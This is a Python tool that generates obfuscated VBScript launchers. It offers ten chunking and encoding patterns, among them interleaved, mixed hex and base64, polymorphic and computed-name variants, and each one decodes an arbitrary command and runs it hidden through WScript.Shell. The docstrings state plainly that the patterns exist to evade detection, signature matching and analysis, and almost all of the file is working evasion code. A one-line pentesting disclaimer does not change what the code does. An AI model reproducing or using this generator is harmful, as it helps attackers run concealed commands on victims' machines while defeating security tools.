#!/usr/bin/env python3
"""
Extended Array Decoder with Multiple Concatenation Patterns
Supports various techniques to avoid detection: sequential, interleaved, nested, mixed-encoding,
reverse-order, chunk-index, obfuscated-variable, and polymorphic patterns.

For authorized pentesting and security research
"""

import binascii
import string
import random
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum


class DecoderPattern(Enum):
    """Available array decoder patterns"""
    SEQUENTIAL = "sequential"           # Standard: a(0), a(1), a(2)...
    INTERLEAVED = "interleaved"         # Alternating: even then odd indices
    NESTED_ARRAY = "nested_array"       # 2D array with row/col access
    MIXED_ENCODING = "mixed_encoding"   # Combine hex + base64 chunks
    REVERSE_ORDER = "reverse_order"     # Process chunks in reverse order
    CHUNK_INDEX = "chunk_index"         # Store chunks as map with string keys
    OBFUSCATED_VAR = "obfuscated_var"   # Use computed/obfuscated variable names
    POLYMORPHIC = "polymorphic"         # Random pattern selection per chunk
    SPLIT_DECODE = "split_decode"       # Decode in separate function, call multiple times
    MATRIX_ACCESS = "matrix_access"     # Treat as matrix with computed indices


@dataclass
class DecoderVariant:
    """Configuration for a specific decoder variant"""
    pattern: DecoderPattern
    chunk_size: int = 16
    use_obfuscation: bool = True
    add_junk_code: bool = False
    randomize_names: bool = True
    comment_style: str = "vbs"  # 'vbs', 'inline', 'none'


class ArrayDecoderPatterns:
    """Multi-pattern array decoder generator"""

    def __init__(self):
        self.var_counter = 0

    def _gen_var(self, prefix: str = "v") -> str:
        """Generate unique variable name"""
        self.var_counter += 1
        return f"{prefix}_{self.var_counter}"

    def _gen_random_var(self, prefix: str = "v") -> str:
        """Generate random variable name"""
        chars = string.ascii_letters
        return prefix + "_" + "".join(random.choices(chars, k=6))

    def _get_var_name(self, prefix: str, randomize: bool) -> str:
        """Get variable name based on randomization setting"""
        return self._gen_random_var(prefix) if randomize else self._gen_var(prefix)

    # ========== PATTERN 1: SEQUENTIAL ==========
    def sequential_decoder(self, payload: str, variant: DecoderVariant) -> str:
        """
        Standard sequential pattern: process array indices in order
        Simple, direct, common method
        """
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        arr_var = self._get_var_name("arr", variant.randomize_names)
        out_var = self._get_var_name("out", variant.randomize_names)
        idx_var = self._get_var_name("idx", variant.randomize_names)
        loop_var = self._get_var_name("chunk", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)

        code = f"Dim {arr_var}({len(chunks)-1})\n"
        for i, chunk in enumerate(chunks):
            hex_chunk = binascii.hexlify(chunk.encode()).decode()
            code += f"{arr_var}({i}) = \"{hex_chunk}\"\n"

        code += f"""
Dim {out_var}
For {idx_var} = 0 To UBound({arr_var})
    Dim {loop_var}
    {loop_var} = {arr_var}({idx_var})
    Dim i
    For i = 1 To Len({loop_var}) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid({loop_var}, i, 2)))
    Next
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== PATTERN 2: INTERLEAVED ==========
    def interleaved_decoder(self, payload: str, variant: DecoderVariant) -> str:
        """
        Interleaved pattern: process even indices first, then odd
        Evades linear execution tracking
        """
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        arr_var = self._get_var_name("arr", variant.randomize_names)
        out_var = self._get_var_name("out", variant.randomize_names)
        idx_var = self._get_var_name("idx", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)

        code = f"Dim {arr_var}({len(chunks)-1})\n"
        for i, chunk in enumerate(chunks):
            hex_chunk = binascii.hexlify(chunk.encode()).decode()
            code += f"{arr_var}({i}) = \"{hex_chunk}\"\n"

        code += f"""
Dim {out_var}, {idx_var}

' Process even indices
For {idx_var} = 0 To UBound({arr_var}) Step 2
    Dim hex_data
    hex_data = {arr_var}({idx_var})
    Dim i
    For i = 1 To Len(hex_data) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid(hex_data, i, 2)))
    Next
Next

' Process odd indices
For {idx_var} = 1 To UBound({arr_var}) Step 2
    Dim hex_data_odd
    hex_data_odd = {arr_var}({idx_var})
    Dim j
    For j = 1 To Len(hex_data_odd) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid(hex_data_odd, j, 2)))
    Next
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== PATTERN 3: NESTED ARRAY (2D) ==========
    def nested_array_decoder(self, payload: str, variant: DecoderVariant) -> str:
        """
        Nested 2D array pattern: organize chunks as rows/columns
        Mimics legitimate data structures
        """
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        # Organize into 2D structure (roughly square)
        cols = max(2, int(len(chunks) ** 0.5) + 1)
        rows = (len(chunks) + cols - 1) // cols

        arr_var = self._get_var_name("matrix", variant.randomize_names)
        out_var = self._get_var_name("result", variant.randomize_names)
        row_var = self._get_var_name("row", variant.randomize_names)
        col_var = self._get_var_name("col", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)

        code = f"Dim {arr_var}({rows-1}, {cols-1})\n"

        idx = 0
        for r in range(rows):
            for c in range(cols):
                if idx < len(chunks):
                    hex_chunk = binascii.hexlify(chunks[idx].encode()).decode()
                    code += f"{arr_var}({r}, {c}) = \"{hex_chunk}\"\n"
                    idx += 1
                else:
                    code += f"{arr_var}({r}, {c}) = \"\"\n"

        code += f"""
Dim {out_var}
For {row_var} = 0 To UBound({arr_var}, 1)
    For {col_var} = 0 To UBound({arr_var}, 2)
        Dim chunk_data
        chunk_data = {arr_var}({row_var}, {col_var})
        If chunk_data <> "" Then
            Dim i
            For i = 1 To Len(chunk_data) Step 2
                {out_var} = {out_var} & Chr(CLng("&H" & Mid(chunk_data, i, 2)))
            Next
        End If
    Next
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== PATTERN 4: MIXED ENCODING ==========
    def mixed_encoding_decoder(self, payload: str, variant: DecoderVariant) -> str:
        """
        Mixed encoding pattern: alternate hex and base64 encoding per chunk
        Evades single-signature detection
        """
        import base64

        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        arr_var = self._get_var_name("mixed", variant.randomize_names)
        enc_var = self._get_var_name("enc", variant.randomize_names)
        out_var = self._get_var_name("out", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)

        code = f"Dim {arr_var}({len(chunks)-1})\n"
        code += f"Dim {enc_var}({len(chunks)-1})\n"

        for i, chunk in enumerate(chunks):
            if i % 2 == 0:  # Hex encoding
                hex_chunk = binascii.hexlify(chunk.encode()).decode()
                code += f"{arr_var}({i}) = \"{hex_chunk}\"\n"
                code += f"{enc_var}({i}) = \"hex\"\n"
            else:  # Base64 encoding
                b64_chunk = base64.b64encode(chunk.encode()).decode()
                code += f"{arr_var}({i}) = \"{b64_chunk}\"\n"
                code += f"{enc_var}({i}) = \"b64\"\n"

        # Helper functions for decoding
        decode_b64 = self._get_var_name("DecodeB64", variant.randomize_names)

        code += f"""
Function {decode_b64}(s)
    Dim xmlDoc
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    xmlDoc.LoadXML "<root><![CDATA[" & s & "]]></root>"
    {decode_b64} = xmlDoc.DocumentElement.text
End Function

Dim {out_var}
Dim i
For i = 0 To UBound({arr_var})
    If {enc_var}(i) = "hex" Then
        Dim hex_str
        hex_str = {arr_var}(i)
        Dim j
        For j = 1 To Len(hex_str) Step 2
            {out_var} = {out_var} & Chr(CLng("&H" & Mid(hex_str, j, 2)))
        Next
    Else
        {out_var} = {out_var} & {decode_b64}({arr_var}(i))
    End If
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== PATTERN 5: REVERSE ORDER ==========
    def reverse_order_decoder(self, payload: str, variant: DecoderVariant) -> str:
        """
        Reverse order pattern: store chunks in normal order but decode in reverse
        Confuses linear analysis
        """
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        arr_var = self._get_var_name("rev_arr", variant.randomize_names)
        out_var = self._get_var_name("out", variant.randomize_names)
        idx_var = self._get_var_name("idx", variant.randomize_names)
        max_idx = self._get_var_name("max_idx", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)

        code = f"Dim {arr_var}({len(chunks)-1})\n"
        for i, chunk in enumerate(chunks):
            hex_chunk = binascii.hexlify(chunk.encode()).decode()
            code += f"{arr_var}({i}) = \"{hex_chunk}\"\n"

        code += f"""
Dim {out_var}, {max_idx}
{max_idx} = UBound({arr_var})

For {idx_var} = {max_idx} To 0 Step -1
    Dim chunk_val
    chunk_val = {arr_var}({idx_var})
    Dim i
    For i = 1 To Len(chunk_val) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid(chunk_val, i, 2)))
    Next
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== PATTERN 6: CHUNK INDEX (Dictionary-like) ==========
    def chunk_index_decoder(self, payload: str, variant: DecoderVariant) -> str:
        """
        Chunk index pattern: use string keys instead of numeric indices
        Mimics associative array access
        """
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        arr_var = self._get_var_name("chunks", variant.randomize_names)
        out_var = self._get_var_name("decoded", variant.randomize_names)
        keys_var = self._get_var_name("keys", variant.randomize_names)
        key_var = self._get_var_name("key", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)

        # Create pseudo-dictionary using keys array
        code = f"Dim {arr_var}, {keys_var}\n"
        code += f"Set {arr_var} = CreateObject(\"Scripting.Dictionary\")\n"
        code += f"Set {keys_var} = CreateObject(\"Scripting.Dictionary\")\n"

        for i, chunk in enumerate(chunks):
            hex_chunk = binascii.hexlify(chunk.encode()).decode()
            key_name = f"chunk_{i}"
            code += f"{arr_var}.Add \"{key_name}\", \"{hex_chunk}\"\n"
            code += f"{keys_var}.Add {i}, \"{key_name}\"\n"

        code += f"""
Dim {out_var}
Dim i
For i = 0 To {keys_var}.Count - 1
    Dim curr_key
    curr_key = {keys_var}.Item(i)
    Dim hex_val
    hex_val = {arr_var}.Item(curr_key)
    Dim j
    For j = 1 To Len(hex_val) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid(hex_val, j, 2)))
    Next
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== PATTERN 7: OBFUSCATED VARIABLE ==========
    def obfuscated_var_decoder(self, payload: str, variant: DecoderVariant) -> str:
        """
        Obfuscated variable pattern: use computed variable names
        Variables are referenced through string manipulation
        """
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        base_var = self._get_var_name("data", variant.randomize_names)
        out_var = self._get_var_name("result", variant.randomize_names)
        idx_var = self._get_var_name("i", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)
        magic_num = self._get_var_name("magic", variant.randomize_names)

        # Create variables with obfuscated names
        code = ""
        obf_map = {}
        for i, chunk in enumerate(chunks):
            hex_chunk = binascii.hexlify(chunk.encode()).decode()
            obf_name = self._get_var_name(f"x", False)  # Minimal name
            code += f"Dim {obf_name}\n"
            code += f"{obf_name} = \"{hex_chunk}\"\n"
            obf_map[i] = obf_name

        # Decode using computed access
        code += f"""
Dim {out_var}
Dim {idx_var}

' Decode each chunk
"""
        for i, obf_name in obf_map.items():
            code += f"""
Dim chunk_{i}
chunk_{i} = {obf_name}
Dim k_{i}
For k_{i} = 1 To Len(chunk_{i}) Step 2
    {out_var} = {out_var} & Chr(CLng("&H" & Mid(chunk_{i}, k_{i}, 2)))
Next
"""

        code += f"""
Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== PATTERN 8: POLYMORPHIC ==========
    def polymorphic_decoder(self, payload: str, variant: DecoderVariant) -> str:
        """
        Polymorphic pattern: randomly select processing order and logic per chunk
        Each execution path is unique
        """
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        arr_var = self._get_var_name("arr", variant.randomize_names)
        out_var = self._get_var_name("out", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)

        code = f"Dim {arr_var}({len(chunks)-1})\n"
        for i, chunk in enumerate(chunks):
            hex_chunk = binascii.hexlify(chunk.encode()).decode()
            code += f"{arr_var}({i}) = \"{hex_chunk}\"\n"

        # Create multiple different decode implementations
        func_names = [self._get_var_name("Decode", variant.randomize_names)
                      for _ in range(3)]

        code += f"""
Function {func_names[0]}(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {func_names[0]} = r
End Function

Function {func_names[1]}(hex_string)
    Dim pos, res
    pos = 1
    Do While pos <= Len(hex_string)
        res = res & Chr(CLng("&H" & Mid(hex_string, pos, 2)))
        pos = pos + 2
    Loop
    {func_names[1]} = res
End Function

Function {func_names[2]}(h)
    Dim chars, idx, out
    idx = 1
    Do
        If idx > Len(h) Then Exit Do
        out = out & Chr(CLng("&H" & Mid(h, idx, 2)))
        idx = idx + 2
    Loop
    {func_names[2]} = out
End Function

Dim {out_var}
Dim i
For i = 0 To UBound({arr_var})
    Select Case (i Mod 3)
        Case 0
            {out_var} = {out_var} & {func_names[0]}({arr_var}(i))
        Case 1
            {out_var} = {out_var} & {func_names[1]}({arr_var}(i))
        Case Else
            {out_var} = {out_var} & {func_names[2]}({arr_var}(i))
    End Select
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== PATTERN 9: SPLIT DECODE ==========
    def split_decode_decoder(self, payload: str, variant: DecoderVariant) -> str:
        """
        Split decode pattern: split chunks into groups and decode in subroutines
        Multiple call stack frames confuse linear analysis
        """
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        # Split into two groups
        mid = len(chunks) // 2
        group1 = chunks[:mid]
        group2 = chunks[mid:]

        arr1_var = self._get_var_name("arr1", variant.randomize_names)
        arr2_var = self._get_var_name("arr2", variant.randomize_names)
        out_var = self._get_var_name("out", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)
        decode_func = self._get_var_name("DecodeGroup", variant.randomize_names)

        code = f"Dim {arr1_var}({len(group1)-1})\n"
        for i, chunk in enumerate(group1):
            hex_chunk = binascii.hexlify(chunk.encode()).decode()
            code += f"{arr1_var}({i}) = \"{hex_chunk}\"\n"

        code += f"Dim {arr2_var}({len(group2)-1})\n"
        for i, chunk in enumerate(group2):
            hex_chunk = binascii.hexlify(chunk.encode()).decode()
            code += f"{arr2_var}({i}) = \"{hex_chunk}\"\n"

        code += f"""
Function {decode_func}(arr)
    Dim result
    Dim i
    For i = 0 To UBound(arr)
        Dim hex_chunk
        hex_chunk = arr(i)
        Dim j
        For j = 1 To Len(hex_chunk) Step 2
            result = result & Chr(CLng("&H" & Mid(hex_chunk, j, 2)))
        Next
    Next
    {decode_func} = result
End Function

Dim {out_var}
{out_var} = {decode_func}({arr1_var}) & {decode_func}({arr2_var})

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== PATTERN 10: MATRIX ACCESS ==========
    def matrix_access_decoder(self, payload: str, variant: DecoderVariant) -> str:
        """
        Matrix access pattern: use computed indices to access array
        Array indices are calculated from expressions
        """
        chunks = [payload[i:i + variant.chunk_size]
                  for i in range(0, len(payload), variant.chunk_size)]

        arr_var = self._get_var_name("matrix", variant.randomize_names)
        out_var = self._get_var_name("output", variant.randomize_names)
        shell_var = self._get_var_name("sh", variant.randomize_names)
        calc_var = self._get_var_name("idx", variant.randomize_names)
        offset_var = self._get_var_name("offset", variant.randomize_names)

        code = f"Dim {arr_var}({len(chunks)-1})\n"
        for i, chunk in enumerate(chunks):
            hex_chunk = binascii.hexlify(chunk.encode()).decode()
            code += f"{arr_var}({i}) = \"{hex_chunk}\"\n"

        code += f"""
Dim {offset_var}
{offset_var} = 0

Dim {out_var}
Dim {calc_var}

' Process using computed indices
For {calc_var} = 1 To {len(chunks)}
    Dim computed_idx
    computed_idx = ({calc_var} - 1 + {offset_var}) Mod {len(chunks)}

    Dim hex_str
    hex_str = {arr_var}(computed_idx)

    Dim i
    For i = 1 To Len(hex_str) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid(hex_str, i, 2)))
    Next
Next

Dim {shell_var}
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
Set {shell_var} = Nothing
"""
        return code.strip()

    # ========== MAIN DECODER FACTORY ==========
    def generate_decoder(self, payload: str, pattern: DecoderPattern,
                        variant: DecoderVariant = None) -> str:
        """
        Main factory method to generate decoder with specified pattern

        Args:
            payload: The command/payload to encode and decode
            pattern: The concatenation pattern to use
            variant: Optional DecoderVariant configuration

        Returns:
            VBS code implementing the specified pattern
        """
        if variant is None:
            variant = DecoderVariant(pattern=pattern)

        if pattern == DecoderPattern.SEQUENTIAL:
            return self.sequential_decoder(payload, variant)
        elif pattern == DecoderPattern.INTERLEAVED:
            return self.interleaved_decoder(payload, variant)
        elif pattern == DecoderPattern.NESTED_ARRAY:
            return self.nested_array_decoder(payload, variant)
        elif pattern == DecoderPattern.MIXED_ENCODING:
            return self.mixed_encoding_decoder(payload, variant)
        elif pattern == DecoderPattern.REVERSE_ORDER:
            return self.reverse_order_decoder(payload, variant)
        elif pattern == DecoderPattern.CHUNK_INDEX:
            return self.chunk_index_decoder(payload, variant)
        elif pattern == DecoderPattern.OBFUSCATED_VAR:
            return self.obfuscated_var_decoder(payload, variant)
        elif pattern == DecoderPattern.POLYMORPHIC:
            return self.polymorphic_decoder(payload, variant)
        elif pattern == DecoderPattern.SPLIT_DECODE:
            return self.split_decode_decoder(payload, variant)
        elif pattern == DecoderPattern.MATRIX_ACCESS:
            return self.matrix_access_decoder(payload, variant)
        else:
            raise ValueError(f"Unknown pattern: {pattern}")

    def generate_all_patterns(self, payload: str) -> Dict[str, str]:
        """
        Generate decoders using all available patterns

        Args:
            payload: The command/payload to encode

        Returns:
            Dictionary mapping pattern names to generated VBS code
        """
        results = {}
        for pattern in DecoderPattern:
            variant = DecoderVariant(pattern=pattern)
            results[pattern.value] = self.generate_decoder(payload, pattern, variant)
        return results


if __name__ == "__main__":
    # Example usage
    generator = ArrayDecoderPatterns()
    test_payload = "powershell.exe -NoProfile -Command Write-Host 'Success'"

    print("\n" + "="*80)
    print("ARRAY DECODER MULTI-PATTERN GENERATOR")
    print("="*80)

    patterns = [
        DecoderPattern.SEQUENTIAL,
        DecoderPattern.INTERLEAVED,
        DecoderPattern.NESTED_ARRAY,
        DecoderPattern.MIXED_ENCODING,
        DecoderPattern.REVERSE_ORDER,
        DecoderPattern.CHUNK_INDEX,
        DecoderPattern.OBFUSCATED_VAR,
        DecoderPattern.POLYMORPHIC,
        DecoderPattern.SPLIT_DECODE,
        DecoderPattern.MATRIX_ACCESS,
    ]

    for pattern in patterns:
        print(f"\n{'-'*80}")
        print(f"Pattern: {pattern.value.upper()}")
        print(f"{'-'*80}")

        variant = DecoderVariant(pattern=pattern, randomize_names=True)
        vbs_code = generator.generate_decoder(test_payload, pattern, variant)

        # Show first 500 chars + summary
        print(f"Generated VBS code ({len(vbs_code)} bytes):")
        print(vbs_code[:500])
        if len(vbs_code) > 500:
            print(f"... ({len(vbs_code) - 500} more bytes)")

        # Show key characteristics
        print(f"\nKey characteristics:")
        print(f"  - Uses For loop: {'For' in vbs_code}")
        print(f"  - Uses array: {'Dim' in vbs_code and '(' in vbs_code}")
        print(f"  - Execution: {'WScript.Shell' in vbs_code}")
        print(f"  - Hex decode: {'Chr(CLng' in vbs_code}")

    print(f"\n{'='*80}")
    print(f"✓ Generated {len(patterns)} distinct array decoder patterns")
    print(f"{'='*80}\n")
